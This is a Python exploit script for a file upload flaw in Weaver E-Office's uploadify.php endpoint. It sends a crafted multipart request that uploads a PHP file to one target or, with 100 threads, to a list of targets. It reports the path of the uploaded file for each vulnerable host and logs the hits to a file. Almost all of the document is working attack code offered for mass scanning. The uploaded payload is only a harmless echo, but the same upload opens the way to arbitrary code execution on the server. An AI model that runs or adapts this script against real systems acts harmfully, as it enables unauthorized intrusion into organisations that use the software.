import requests,sys,argparse,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """               ______            _________   __________________     
____  ____________  /___________ ______  /   ___  __/__(_)__  /____ 
_  / / /__  __ \_  /_  __ \  __ `/  __  /    __  /_ __  /__  /_  _ \
/ /_/ /__  /_/ /  / / /_/ / /_/ // /_/ /     _  __/ _  / _  / /  __/
\__,_/ _  .___//_/  \____/\__,_/ \__,_/      /_/    /_/  /_/  \___/ 
       /_/                                                          """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微E-Office uploadify.php后台文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/inc/jquery/uploadify/uploadify.php'
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length':'227',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Content-Type':'multipart/form-data; boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s'
    }
    data = f'--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 123456;?>\r\n\r\n--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and res.text.isdigit():
            print(f'[+]存在漏洞：{target},请访问路径/attachment/{res.text}/1.php')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'  请访问路径：/attachment/'+res.text+'/1.php\n')
        else:
            print(f'[-]不存在漏洞：{target}')
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')

if __name__ == '__main__':
    main()